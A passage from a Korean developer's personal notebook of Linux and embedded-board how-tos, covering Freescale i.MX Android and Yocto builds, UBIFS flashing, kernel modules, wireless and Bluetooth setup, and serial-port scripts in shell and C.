    Unit Size : 2048
    ```
3.  Default Kernel command line 수정  
    
    ```text
    Packege list => boot stream
    noinitrd console=ttyAM0,115200 ubi.mtd=1 root=ubi0:rootfs rootfstype=ubifs rw gpmi
    ```
4.  Build boot stream  
    
    ```text
    $ ./ltib -p boot_stream.spec -f
    ```
5.  sd 카드 부팅후 빌드한 ubifs 이미지 라이팅빌드한 rootfs.ubifs 를 nfs 등 적당한 디렉토리에 복사후 라이팅한다.  
    
    ```text
    $ flash_erase /dev/mtd0 0 0
    $ kobs-ng init imx28_ivt_linux.sb
    $ flash_erase /dev/mtd1 0 0
    $ ubiattach /dev/ubi_ctrl -d 0 -m 1
    $ /usr/bin/ubimkvol /dev/ubi0 -N rootfs -s 32MiB
    $ /usr/bin/ubimkvol  /dev/ubi0 -N data -m
    // /sbin/ubimkvol은 제대로 동작하지 않는다. /usr/bin/ubimkvol 사용.
    // kernel command line 에 기입한 것에 +1을 더한 숫자를 rootfs
    // 이름으로 한다. kernel command line = rootfs0 -> -N rootfs1 으로
    $ ubiupdatevol /dev/ubi0_0 rootfs.ubifs
    $ mount -t ubifs /dev/ubi0_0 /mnt/rwfs
    ```


### <span class="section-num">3.35</span> FreeScale MX6 Android Build {#freescale-mx6-android-build}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-10-12 월 17:48&gt;</span></span>  

1.  빌드 환경 셋팅  
    Lollipop 을 빌드하기 위해선 우분투 14.04 64비트 버전을 추천한다.  
    -   빌드시 필요한 패키지 설치  
        
        ```text
        $ sudo apt-get install uuid uuid-dev zlib1g-dev liblz-dev liblzo2-2 liblzo2-dev lzop git-core curl u-boot-tools mtd-utils
        ```
2.  FreeScale 소스 압축해제적당한 디렉토리에 FreeScale 다운로드 페이지에서 받은 소스파일압축을 해제한다.  
    
    ```text
    $ tar xzvf android_L5.0.0_1.0.0-ga_core_source.tar.gz
    $ cd android_L5.0.0_1.0.0-ga_core_source/code/
    $ tar xzvf l5.0.0_1.0.0-ga.tar.gz
    ```
3.  구글 안드로이드 저장소를 받아온다. (2,3시간 걸린다. 헐;;)  
    
    ```text
    $ curl http://commondatastorage.googleapis.com/git-repo-downloads/repo > ~/bin/repo
    $ chmod a+x ~/bin/repo
    $ mkdir myandroid
    $ cd myandroid
    $ ~/bin/repo init -u https://android.googlesource.com/platform/manifest -b android-5.0.2_r1
    $ ~/bin/repo sync # this command loads most needed repos. Therefore, it can take several
    ```
4.  기본 GCC 툴체인이 안드로이드 커널을 빌드하는데 문제가 있어 하위버전을 체크아웃한다.  
    
    ```text
    $ cd ~/myandroid/prebuilts/gcc/linux-x86/arm
    $ git clone https://android.googlesource.com/platform/prebuilts/gcc/linux-x86/arm/arm-eabi-4.6
    $ cd arm-eabi-4.6
    $ git checkout android-4.4.3_r1
    ```
5.  FreeScale git 서버에서 커널 소스를 받는다.  
    
    ```text
    $ git clone git://git.freescale.com/imx/linux-2.6-imx.git kernel_imx 
    large. Therefore, this process can take a while.
    $ cd kernel_imx
    $ git checkout l5.0.0_1.0.0-ga
    ```
6.  FreeScale git 서버에서 u-boot 소스를 받는다.  
    
    ```text
    $ cd bootable/bootloader
    $ git clone git://git.freescale.com/imx/uboot-imx.git uboot-imx
    $ cd uboot-imx
    $ git checkout l5.0.0_1.0.0-ga
    ```
7.  FreeScale android 패치를 한다.  
    
    ```text
    $ source /opt/android_L5.0.0_1.0.0-ga_core_source/code/l5.0.0_1.0.0-ga/and_patch.sh
    $ c_patch /opt/android_L5.0.0_1.0.0-ga_core_source/code/l5.0.0_1.0.0-ga
    ```
8.  추가 패치  
    omxplayer를 사용하기 위해서는 아래 패치를 하라고 되어 있으나  
    android\_L5.0.0\_1.0.0-ga\_omxplayer\_source.tar.gz 파일은 공개 하지않고 있으니 따로 freescale에 요청을 하라고 한다.  
    
    ```text
    $ cp android_L5.0.0_1.0.0-ga_omxplayer_source.tar.gz ~/myandroid
    $ cd ~/myandroid
    $ tar xzvf android_L5.0.0_1.0.0-ga_omxplayer_source.tar.gz
    ```
9.  빌드한다  
    
    ```text
    $ source build/envsetup.sh
    $ lunch sabresd_6dq-userdebug
    $ make 2>&1 | tee build-log.txt
    ```


#### <span class="section-num">3.35.1</span> Build names {#build-names}

Build\_name | Description  
evk\_6sl | i.MX 6SoloLite Eval Kit  
sabreauto\_6q | i.MX 6Quad Auto Infotainment  
sabresd\_6dq | i.MX 6DualQuad SABRE Board and SABRE Platform  
sabresd\_6sx | i.MX 6SoloX SABRE Board  
sabreauto\_6sx | i.MX 6SoloX Auto Infotainment  


### <span class="section-num">3.36</span> FreeScale Yocto Project {#freescale-yocto-project}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-10-13 화 20:21&gt;</span></span>  
오픈 소스 기반의 yocto 프로젝트를 이용한 BSP release 이다.  

1.  호스트 설정  
    120GB이상의 하드 여유 공간이 있는 x11기반 ubuntu 14.04 배포판을권장한다.  
    -   필요 패키지 설치  
        
        ```text
        $ sudo apt-get install gawk wget git-core diffstat unzip texinfo gcc-multilib \
        build-essential chrpath socat
        $ sudo apt-get install libsdl1.2-dev xterm sed cvs subversion coreutils texi2html \
        docbook-utils python-pysqlite2 help2man make gcc g++ desktop-file-utils \
        libgl1-mesa-dev libglu1-mesa-dev mercurial autoconf automake groff curl lzop\
        asciidoc u-boot-tools
        $ curl http://commondatastorage.googleapis.com/git-repo-downloads/repo > ~/bin/repo
        ```
2.  프로젝트 설정  
    
    ```text
    $ mkdir fsl-release-bsp && cd fsl-release-bsp
    $ repo init -u \
    git://git.freescale.com/imx/fsl-arm-yocto-bsp.git -b imx-3.14.28-1.0.0_ga
    $ repo sync
    ```
3.  빌드하기  
    1.  어떤 이미지를 빌드할지 결정한다.  
        
        지원하는 이미지 종류 찾기  
        
        ```text
        $ find sources -name *image*
        ```
    2.  빌드 환경 설정  
        \*주의사항\*  
        shell의 dotglob 옵션을 disable 하여야 한다.  
        
        ```text
        $ shopt -u dotglob
        ```
    
    3.  환경 설정 두번째 단계  
        
        ```text
        $ MACHINE=<machine name> source fsl-setup-release.sh -b <build dir> -e <backend>
        $ MACHINE=imx6qsabresd source fsl-setup-release.sh -b build-x11 -e x11
        ```
        
        <build dir>/conf/local.conf 파일을 수정하여 설정할 수 도 있다.  
        성능 향상을 위하여 local.conf 파일에 아래 설정을 할 수 있다.  
        
        ```text
        DL_DIR="/opt/freescale/yocto/imx/download"
        SSTATE_DIR="/opt/freescale/yocto/imx/sstate-cache"
        ```
    
    4.  빌드 시작  
        
        ```text
        $ bitbake fsl-image-gui
        ```
    
    5.  빌드 환경설정 다시하기  
        
        ```text
        // $ source setup-environment <build-dir>
        $ source setup-environment build-x11
        ```

4.  Manufacturing Tool Build  
    
    ```text
    $ bitbake fsl-image-mfgtool-initramfs
    ```
    
    kernel 빌드시  imx\_v7\_mfg\_defconfig 파일이 사용된다.  
    빌드 되는 이미지는 linux-imx-mfgtool and u-boot-mfgtool 파일이다.

5.  이미지 쓰기  
    -   SD 카드에 쓰기  
        
        ```text
        $ sudo dd if=<image name>.sdcard of=/dev/sd<partition> bs=1M && sync
        ```
    -   MFG 툴 사용하여 쓰기


### <span class="section-num">3.37</span> auto login script {#auto-login-script}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-10-30 금 16:51&gt;</span></span>  

```sh
#!/usr/bin/expect #Where the script should be run from.

#If it all goes pear shaped the script will timeout after 20 seconds.
set timeout 20
#First argument is assigned to the variable name
set name [lindex $argv 0]
#Second argument is assigned to the variable user
set user [lindex $argv 1]
#Third argument is assigned to the variable password
set password [lindex $argv 2]
#This spawns the telnet program and connects it to the variable name
spawn telnet $name 
#The script expects login
expect "login:" 
#The script sends the user variable
send "$user "
#The script expects Password
expect "Password:"
#The script sends the password variable
send "$password "
#This hands control of the keyboard over two you (Nice expect feature!)
interact

```


#### <span class="section-num">3.37.1</span> 출처 {#출처}

[stackoverflow](http://stackoverflow.com/questions/7013137/automating-telnet-session-using-bash-scripts)  


### <span class="section-num">3.38</span> shell no operation command {#shell-no-operation-command}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-10-30 금 17:49&gt;</span></span>  
The no-op command in shell is :  

```text
if [ "$a" -ge 10 ]
then
    :
elif [ "$a" -le 5 ]
then
    echo "1"
else
    echo "2"
fi
```


### <span class="section-num">3.39</span> apt key add {#apt-key-add}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-04 수 22:29&gt;</span></span>  

```text
$ wget -qO - http://londo.ganneff.de/apt.key | sudo apt-key add -
```

다른 방법  

```text
sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com 3B4FE6ACC0B21F32
```


### <span class="section-num">3.40</span> projectile 사용법 {#projectile-사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-05 목 15:24&gt;</span></span>  
emacs 에서 프로젝트별로 파일 찾기, grep 등의 동작을 빠르고 편라하게할수 있도록 하는 라이브러리이다. git, mercurial, darcs and bazaar 등의저장소는 자동으로 인식하고 수동으로는 루트폴더에 빈 .projectile 파일을생성함으로써 project 리스트를 추가 할 수 있다. helm-proejectile  
패키지와 연동하여 좀 더 편리한 인터페이스를 구현할 수 있다.  


#### <span class="section-num">3.40.1</span> 설치 {#설치}

projectile, helm-projectile 패키지를 설치하고 emacs 시작 파일에 다음추가  

```text
(projectile-global-mode)
(setq projectile-completion-system 'helm)
(helm-projectile-on)
(setq projectile-enable-caching t)
```


#### <span class="section-num">3.40.2</span> 단축키 {#단축키}


#### <span class="section-num">3.40.3</span> 참조 {#참조}

<https://github.com/bbatsov/projectile>  
<http://tuhdo.github.io/helm-projectile.html>  


### <span class="section-num">3.41</span> 리눅스 커널 모듈 {#리눅스-커널-모듈}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-07 토 13:47&gt;</span></span>  


#### <span class="section-num">3.41.1</span> 정보 {#정보}

1.  모듈 정보 보기  
    
    ```text
    $ modinfo modulename
    ```
2.  모듈 옵션 보기  
    
    ```text
    $ systool -v -m modulename
    ```
3.  모듈 의존성 보기  
    
    ```text
    $ modprobe --show-depends module_name
    ```


#### <span class="section-num">3.41.2</span> 로딩 {#로딩}

1.  자동 로딩  
    /etc/modules-load.d/<program>.conf 에 라인단위로 작성라인 처음 ;,# 는 주석  
    
    ```text
    /etc/modules-load.d/virtio-net.conf
    # Load virtio-net.ko at boot
    virtio-net
    ```
2.  수동 로딩  
    modprobe insmod 사용


#### <span class="section-num">3.41.3</span> 옵션 {#옵션}

1.  명령행  
    
    ```text
    $ sudo modprobe module_name parameter_name=parameter_value
    ```
2.  파일  
    /etc/modprobe.d 아래 파일 작성  
    
    ```text
    /etc/modprobe.d/myfilename.conf
    options module_name parameter_name=parameter_value
    ```
3.  커널 커멘드라인  
    
    ```text
    module_name.parameter_name=parameter_value
    thinkpad_acpi.fan_control=1
    ```


#### <span class="section-num">3.41.4</span> blacklist {#blacklist}

1.  파일  
    /etc/modprobe.d/ 아래 파일 작성  
    
    ```text
    /etc/modprobe.d/nobeep.conf
    # Do not load the 'pcspkr' module on boot.
    blacklist pcspkr
    ```
2.  커널 커멘드 라인  
    
    ```text
    modprobe.blacklist=modname1,modname2,modname3
    ```


#### <span class="section-num">3.41.5</span> 출처 {#출처}

<https://wiki.archlinux.org/index.php/Kernel%5Fmodules>  


### <span class="section-num">3.42</span> wireless {#wireless}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-07 토 14:58&gt;</span></span>  


#### <span class="section-num">3.42.1</span> Driver 상태 확인 {#driver-상태-확인}

```text
$ lspci -k
or
$ lsusb -v
```


#### <span class="section-num">3.42.2</span> tool 사용법 {#tool-사용법}

iw, wireless\_tools, wpa\_supplicant tool을 사용한다.  

1.  interface 이름 찾기  
    
    ```text
    $ iw dev
    ```
2.  link 상태 보기  
    
    ```text
    $ iw dev wlan0 link
    ```
3.  interface 활성화  
    
    ```text
    $ sudo ip link set wlan0 up
    $ ip link show wlan0
    3: wlp0s18f2u4: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc fq_codel 
    state DOWN mode DORMANT group default qlen 1000
     link/ether 00:14:85:d7:0e:54 brd ff:ff:ff:ff:ff:ff
    ```
    
    <NO-CARRIER,BROADCAST,MULTICAST,UP> 이 부분이 UP 으로 나타나야 한다.  
    state DOWN은 상관없다.
4.  AP 찾기  
    
    ```text
    $ sudo iw dev wlan0 scan
    ```
5.  연결  
    -   No Encryption  
        
        ```text
        $ sudo iw dev wlan0 connect "your_essid"
        ```
    -   WEP  
        
        ```text
        $ sudo iw dev wlan0 connect "your_essid" key 0:your_key
        ```
    -   WPA/WPA2  
        
        ```text
        $ sudo wpa_supplicant -D nl80211,wext -i wlan0 -c <(wpa_passphrase "your_SSID" "your_key")
        ```
6.  ip addr 할당  
    
    ```text
    $ sudo dhcpcd wlan0
    or
    $ sudo ip addr add 192.168.0.2/24 dev wlan0
    $ sudo ip route add default via 192.168.0.1
    ```


#### <span class="section-num">3.42.3</span> 연결 예제 {#연결-예제}

```text
$ sudo ip link set dev wlp13s1 up
$ sudo wpa_supplicant -B -i wlp13s1 -c /etc/wpa_supplicant/wpa_supplicant.conf
$ sudo dhcpcd wlp13s1
연결 해지
$ sudo ip addr flush dev wlp13s1
$ sudo ip route flush dev wlp13s1
$ sudo ip link set dev wlp13s1 down
```


#### <span class="section-num">3.42.4</span> rfkill {#rfkill}

카드가 하드웨어나 소프트웨어적으로 block 되었을때 해지할 수 있다.  
block, unblock을 호출하면 카드를 리셋하는 것과 같다.  

```text
$ rfkill list
1: phy0: Wireless LAN
	Soft blocked: yes
	Hard blocked: no
2: hci0: Bluetooth
	Soft blocked: no
	Hard blocked: no
$ sudo rfkill unblock 1
```


#### <span class="section-num">3.42.5</span> regdomain 설정 {#regdomain-설정}

국가별로 wireless 송신 파워나 채널 등을 할당하고 규제하는데 이를설정한다.  

```text
$ iw reg get
$ sudo iw reg set KR
```


#### <span class="section-num">3.42.6</span> 절전 {#절전}

```text
$ sudo iw dev wlan0 set power_save on
```


#### <span class="section-num">3.42.7</span> help {#help}

iw, wpa\_supplicant, rfkill 등 옵션없이 명령어만 입력하고실행하면 도움말을 볼 수 있다.  


#### <span class="section-num">3.42.8</span> 참조 {#참조}

[arch wiki](https://wiki.archlinux.org/index.php/Wireless%5Fnetwork%5Fconfiguration#Access%5Fpoint%5Fdiscovery)  


### <span class="section-num">3.43</span> remount partition {#remount-partition}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-09 월 18:35&gt;</span></span>  

```text
$ mount -o remount,rw /dev/root /
```


### <span class="section-num">3.44</span> iperf 사용법 {#iperf-사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-09 월 21:02&gt;</span></span>  
네트워크 디바이스의 성능을 측정한다.  

1.  서버  
    
    ```text
    $ iperf -s
    ```
2.  클라이언트  
    30초 동안 프로세스 8개가 동시에 연결하여 성능 측정  
    
    ```text
    $ ./iperf -c 10.12.240.32 -t 30 -P 8
    ------------------------------------------------------------
    Client connecting to 10.12.240.32, TCP port 45678
    TCP window size: 48.0 KByte (default)
    ------------------------------------------------------------
    [ 10] local 10.12.240.33 port 37842 connected with 10.12.240.32 port 45678
    [  3] local 10.12.240.33 port 37835 connected with 10.12.240.32 port 45678
    [  4] local 10.12.240.33 port 37836 connected with 10.12.240.32 port 45678
    [  5] local 10.12.240.33 port 37837 connected with 10.12.240.32 port 45678
    [  6] local 10.12.240.33 port 37838 connected with 10.12.240.32 port 45678
    [  7] local 10.12.240.33 port 37839 connected with 10.12.240.32 port 45678
    [  8] local 10.12.240.33 port 37840 connected with 10.12.240.32 port 45678
    [  9] local 10.12.240.33 port 37841 connected with 10.12.240.32 port 45678
    [ ID] Interval       Transfer     Bandwidth
    [  5]  0.0-30.0 sec  41.6 MBytes  11.6 Mbits/sec
    [ ID] Interval       Transfer     Bandwidth
    [  7]  0.0-30.0 sec  41.0 MBytes  11.5 Mbits/sec
    [ ID] Interval       Transfer     Bandwidth
    [  8]  0.0-30.0 sec  41.5 MBytes  11.6 Mbits/sec
    [ ID] Interval       Transfer     Bandwidth
    [ 10]  0.0-30.0 sec  41.4 MBytes  11.6 Mbits/sec
    [ ID] Interval       Transfer     Bandwidth
    [  9]  0.0-30.0 sec  42.6 MBytes  11.9 Mbits/sec
    [ ID] Interval       Transfer     Bandwidth
    [  4]  0.0-30.0 sec  41.0 MBytes  11.5 Mbits/sec
    [ ID] Interval       Transfer     Bandwidth
    [  6]  0.0-30.0 sec  41.5 MBytes  11.6 Mbits/sec
    [ ID] Interval       Transfer     Bandwidth
    [  3]  0.0-30.0 sec  41.4 MBytes  11.6 Mbits/sec
    [SUM]  0.0-30.0 sec    332 MBytes  92.7 Mbits/sec
    ```


### <span class="section-num">3.45</span> ip route change default gw dev {#ip-route-change-default-gw-dev}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-09 월 21:13&gt;</span></span>  

```text
ip route change default via 192.168.0.1 dev eth1
```


### <span class="section-num">3.46</span> dirty kernel release {#dirty-kernel-release}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-10 화 10:07&gt;</span></span>  
커널 릴리즈에 dirty 가 붙은 경우는 저장소를 commit 하지 않고 커널을빌드하면 나타난다.  


### <span class="section-num">3.47</span> 기존 디렉토리 git 저장소 초기화 {#기존-디렉토리-git-저장소-초기화}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-11 수 12:35&gt;</span></span>  

```text
cd <localdir>
git init
git add .
git commit -m 'message'
```


### <span class="section-num">3.48</span> shell script 에서 디렉토리 파일 읽어오기 {#shell-script-에서-디렉토리-파일-읽어오기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-11 수 18:16&gt;</span></span>  
shell script 작성시 디렉토리 파일을 읽어오기 위해 $(ls \*) 같은 방법을사용하였다. 그냥 \* 문자 하나면 사용하면 된다.  

```sh
for f in *
do
    echo "$f"
done
```


### <span class="section-num">3.49</span> Bluetooth {#bluetooth}

데비안에서 bluetooth 사용을 위해서는 bluetooth dummy 패키지를 설치한다.  
bluez 패키지가 자동 설치된다. gui 설정을 위해서는 blueman이나  
bluedevil등 기호에 맞는 패키지를 설치하면 된다.  
<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-13 금 15:44&gt;</span></span>  


#### <span class="section-num">3.49.1</span> cli로 간단히 연결하기 {#cli로-간단히-연결하기}

```text
$ bluetoothctl
[bluetooth]# power on                          // Power on the Bluetooth device
[bluetooth]# agent on                          // Start the agent
[bluetooth]# default-agent                     // Set agent as the default one
[bluetooth]# pairable on                       // Allow pairing
[bluetooth]# scan on                           // Enable scan so discoverable devices will be displayed
[bluetooth]# pair <remote_device_MAC@>         // Pair with a discovered device
[bluetooth]# connect <remote_device_MAC@>      // Connect to a device
```


#### <span class="section-num">3.49.2</span> bluez test tool {#bluez-test-tool}

1.   hciconfig

    bluetooth device 정보와 up down  
    
    ```text
    $ hciconfig
    hci0:	Type: BR/EDR  Bus: USB
    	BD Address: 00:15:83:50:5D:57  ACL MTU: 510:8  SCO MTU: 48:10
    	UP RUNNING PSCAN ISCAN 
    	RX bytes:366374 acl:106 sco:0 events:51596 errors:0
    	TX bytes:34062222 acl:79747 sco:0 commands:250 errors:0
    $ hciconfig -a hci0
    hci0:	Type: BR/EDR  Bus: USB
    	BD Address: 00:15:83:50:5D:57  ACL MTU: 510:8  SCO MTU: 48:10
    	UP RUNNING PSCAN ISCAN 
    	RX bytes:366374 acl:106 sco:0 events:51596 errors:0
    	TX bytes:34062222 acl:79747 sco:0 commands:250 errors:0
    	Features: 0xff 0xfe 0xff 0xfe 0x98 0x3f 0x79 0x83
    	Packet type: DM1 DM3 DM5 DH1 DH3 DH5 HV1 HV2 HV3 
    	Link policy: RSWITCH HOLD SNIFF 
    	Link mode: SLAVE ACCEPT 
    	Name: 'debian-ar'
    	Class: 0x0c0104
    	Service Classes: Rendering, Capturing
    	Device Class: Computer, Desktop workstation
    	HCI Version: 2.1 (0x4)  Revision: 0x1311
    	LMP Version: 2.1 (0x4)  Subversion: 0x1311
    	Manufacturer: Integrated System Solution Corp. (57)
    // Device up down
    $ hciconfig hci0 up
    $ hciconfig hci0 down
    ```

2.   hcitool

    dev, scan, info, cc ,auth ,dc 등의 테스트 명령 제공  
    
    ```text
    ybgwon@debian-ar:totem$ hcitool
    hcitool - HCI Tool ver 5.23
    Usage:
    	hcitool [options] <command> [command parameters]
    Options:
    	--help	Display help
    	-i dev	HCI device
    Commands:
    	dev 	Display local devices
    	inq 	Inquire remote devices
    	scan	Scan for remote devices
    	name	Get name from remote device
    	info	Get information from remote device
    	spinq	Start periodic inquiry
    	epinq	Exit periodic inquiry
    	cmd 	Submit arbitrary HCI commands
    	con 	Display active connections
    	cc  	Create connection to remote device
    	dc  	Disconnect from remote device
    	sr  	Switch master/slave role
    	cpt 	Change connection packet type
    	rssi	Display connection RSSI
    	lq  	Display link quality
    	tpl 	Display transmit power level
    	afh 	Display AFH channel map
    	lp  	Set/display link policy settings
    	lst 	Set/display link supervision timeout
    	auth	Request authentication
    	enc 	Set connection encryption
    	key 	Change connection link key
    	clkoff	Read clock offset
    	clock	Read local or remote clock
    	lescan	Start LE scan
    	lewladd	Add device to LE White List
    	lewlrm	Remove device from LE White List
    	lewlsz	Read size of LE White List
    	lewlclr	Clear LE White list
    	lecc	Create a LE Connection
    	ledc	Disconnect a LE Connection
    	lecup	LE Connection Update
    
    For more information on the usage of each command use:
    	hcitool <command> --help
    ```

3.   hidd

    구 버전 연결 프로그램  
    
    ```text
    $ hidd --connect <BT_Address>
    ```

4.   참조 링크

    <https://wiki.debian.org/BluetoothUser>  


#### <span class="section-num">3.49.3</span> A2DP 설정 {#a2dp-설정}

Advanced Audio Distribution Profile 의 약자로 bluetooth 장치에서고음질 오디오와 관련된 profile이다. 블루투스 헤드셋이나 스피커로고음질 미디어를 감상하려면 이 프로파일을 사용하여야 한다.  
현재(2015. 11. 13. (금) 16:10:47 KST) 데비안 리눅스는 bluez 5.23을사용하고 현재 최신 버전은 5.36 인데 현재 버전의 bluez 는 pulseaudio와연동해서만 동작한다. 현재 버그가 많고 데비안 위키에 내용대로 하였지만  
bluetooth 연결이 끊기거나 오디오 싱크가 안맞는 문제가 있었다. 결국  
pulseaudio-module-bluetooth 패키지가 키인데 suggests 패키지를 같이설치하면서 해결되었다. blueman 설정에서 고급 오디오, 헤드셋 설정을체크하였다.  

```text
$ sudo apt-get install blueman bluez pulseaudio-module-bluetooth --install-suggests

$ pactl load-module module-bluetooth-discover
// 위는 /etc/pulse/default.pa 파일에 이미 load 하도록 되어있다.
```


### <span class="section-num">3.50</span> Cortex-A9 컴파일러 옵션 {#cortex-a9-컴파일러-옵션}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-17 화 01:08&gt;</span></span>  


#### <span class="section-num">3.50.1</span> -mcpu = cortex-a9 {#mcpu-cortex-a9}


#### <span class="section-num">3.50.2</span> -march = armv7-a {#march-armv7-a}


#### <span class="section-num">3.50.3</span> 디버깅 {#디버깅}

-g : 디버깅 옵션 지정  
-mno\_debug : 디버그 테이블 추가하지 않음  


#### <span class="section-num">3.50.4</span> 최적화 {#최적화}

-O[0-3] : 최소, 제한적, 많이, 최대  
-Os : 사이즈 최적화  
-Ofast : 실행시간 최적화  


### <span class="section-num">3.51</span> tar 유틸 사용시 버전 관련 파일 제외하고 묶을때 {#tar-유틸-사용시-버전-관련-파일-제외하고-묶을때}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-17 화 11:51&gt;</span></span>  
tar 로 묶을시 .git 디렉토리를 제외하려면 &#x2013;exclude-vcs 옵션을사용한다.  

```text
$ tar cvf u-boot-2009.08-fastboot.tar u-boot-2009.08-fastboot --exclude-vcs
```


### <span class="section-num">3.52</span> shell serial programming {#shell-serial-programming}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-21 토 17:36&gt;</span></span>  


#### <span class="section-num">3.52.1</span> 설정 {#설정}

serial 통신을 위한 터미널 설정을 stty 명령을 사용해 할 수 있다.  

```text
stty -F /dev/ttyS0 speed 9600 cs8 -cstopb -parenb
```

-F : 시리얼 디바이스 지정  
speed : baudrate 설정값 출력  
baudrate 설정을 위해서는 그냥 baudrate 값을 적어 주거나  
input, output을 아래와 값이 따로 지정할 수 있다.  
ispeed : input speed  
ospeed : output speed  
csN : character size N bits  
cstopb : use 2 stop bits  -사인이 있으면 1 stop bits  
parenb : 패리티 체크. -사인이 있으면 체크 안함.  


#### <span class="section-num">3.52.2</span> READ {#read}

```text
$ cat  /dev/ttyUSB0
```

Ctrl-c를 누르기 전까지 종료되지 않는다.  

hex 값으로 읽기. -tx1 은 16진수 1byte format이다.  

```text
$ od -tx1 < /dev/ttyUSB0
```

몇 라인만 읽으려면 head 사용  

```text
$ head -6 /dev/ttyUSB0
```


#### <span class="section-num">3.52.3</span> WRITE {#write}

```text
echo -n "AT" > /dev/ttyUSB0
```

16진수로 쓰기  

```text
echo -en "\x41\x54\x0a" > /dev/ttyUSB0
```


### <span class="section-num">3.53</span> Serial C Programming Exam {#serial-c-programming-exam}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-21 토 19:31&gt;</span></span>  

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <termios.h>

int main(int argc,char** argv)
{
	struct termios tio;
	struct termios stdio;
	struct termios old_stdio;
	int tty_fd;

	unsigned char c='D';
	tcgetattr(STDOUT_FILENO,&old_stdio);

	printf("Please start with %s /dev/ttyS1 (for example)\n",argv[0]);
	memset(&stdio,0,sizeof(stdio));
	stdio.c_iflag=0;
	stdio.c_oflag=0;
	stdio.c_cflag=0;
	stdio.c_lflag=0;
	stdio.c_cc[VMIN]=1;
	stdio.c_cc[VTIME]=0;
	tcsetattr(STDOUT_FILENO,TCSANOW,&stdio);
	tcsetattr(STDOUT_FILENO,TCSAFLUSH,&stdio);
	fcntl(STDIN_FILENO, F_SETFL, O_NONBLOCK);       // make the reads non-blocking

	memset(&tio,0,sizeof(tio));
	tio.c_iflag=0;
	tio.c_oflag=0;
	tio.c_cflag=CS8|CREAD|CLOCAL;           // 8n1, see termios.h for more information
	tio.c_lflag=0;
	tio.c_cc[VMIN]=1;
	tio.c_cc[VTIME]=5;

	tty_fd=open(argv[1], O_RDWR | O_NONBLOCK);      
	cfsetospeed(&tio,B115200);            // 115200 baud
	cfsetispeed(&tio,B115200);            // 115200 baud

	tcsetattr(tty_fd,TCSANOW,&tio);
	while (c!='q')
	{
		if (read(tty_fd,&c,1)>0)        write(STDOUT_FILENO,&c,1);              // if new data is available on the serial port, print it out
		if (read(STDIN_FILENO,&c,1)>0)  write(tty_fd,&c,1);                     // if new data is available on the console, send it to the serial port
	}

	close(tty_fd);
	tcsetattr(STDOUT_FILENO,TCSANOW,&old_stdio);

	return EXIT_SUCCESS;
}
```

<https://en.wikibooks.org/wiki/Serial%5FProgramming/Serial%5FLinux>  


### <span class="section-num">3.54</span> GPS data parse shell script {#gps-data-parse-shell-script}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2015-11-21 토 21:21&gt;</span></span>  

```shell
# !bin/sh
#
# getloc - read GPS location and echo status, latitude and longitude
#          separated by a space. Status 0 is success.

function closePort() {
  exec 5<&-
}

function openPort() {
  exec 5</dev/ttyS3
}

# Pass the GPS value and direction (N/S/E/W) to get the
# decimal latitude/longitude.
function gpsDecimal() {
    gpsVal=$1
    gpsDir ="$2"
    # Integer part of the lat/long
    gpsInt=`echo "scale=0;$gpsVal/100" | bc`
    # Minutes part of the lat/long
    gpsMin=`echo "scale=3;$gpsVal-100*$gpsInt" | bc`
    # Convert minutes to a full decimal value
    gpsDec=`echo "scale=5;$gpsInt+$gpsMin/60" | bc`
    # South and West are negative
    if [[ $gpsDir -eq "W" || $gpsDir -eq "S" ]]
    then
      gpsDec="-$gpsDec"
    fi
    echo $gpsDec
}

# Return statuses
STATUS_OK=0
STATUS_NOFIX_SATDATA=1
STATUS_TIMEOUT=2
STATUS_NOTFOUND=3
STATUS_NOFIX_LOCDATA=4

# Status and counter values
foundReliability='false'
foundLocation='false'
linesRead=0

openPort
while [[ $linesRead -le 100 && ($foundReliability = 'false' || $foundLocation = 'false') ]]
do
  # Read the next line from the GPS port, with a timeout of 10 seconds.
  read -t 10 RESPONSE <&5
  if [[ $? -eq 1 ]]
  then
    # Read timed out so bail with error
    closePort
    echo "$STATUS_TIMEOUT 0 0"
    exit 1
  fi

  # Fallthrough: line was read. Count it because we have a threshhold
  # for the number of sentences to process before giving up.
  linesRead=`expr $linesRead + 1`

  # Get the sentence type.
  sentenceType=`echo $RESPONSE | cut -d',' -f1`

  if [[ $sentenceType = '$GPGSA' && $foundReliability = 'false' ]]
  then
    # Found the "fix information" sentence; see if the reliability
    # is at least 2.
    fixValue=`echo $RESPONSE | cut -d',' -f3`
    if [[ $fixValue -ne 2 && $fixValue -ne 3 ]]
    then
      # Insufficient fix quality so bail with error
      closePort
      echo "$STATUS_NOFIX_SATDATA 0 0"
      exit 1
    fi
    # Fallthrough: reliability is sufficient
    foundReliability='true'
  fi # GPGSA sentence

  if [[ $sentenceType = '$GPRMC' && $foundLocation = 'false' ]]
  then
    # Found the "recommended minimum data" (GPRMC) sentence;
    # determine if it's "active", which means "valid".
    #
    statusValue=`echo $RESPONSE | cut -d',' -f3`
    if [[ $statusValue = 'V' ]]
    then
      # Void status; can't use the reading so bail
      closePort
      echo "$STATUS_NOFIX_LOCDATA 0 0"
      exit 1
    fi

    # Fallthrough: active status, so we can use the reading.
    foundLocation='true'
    latitudeValue=`echo $RESPONSE | cut -d',' -f4`
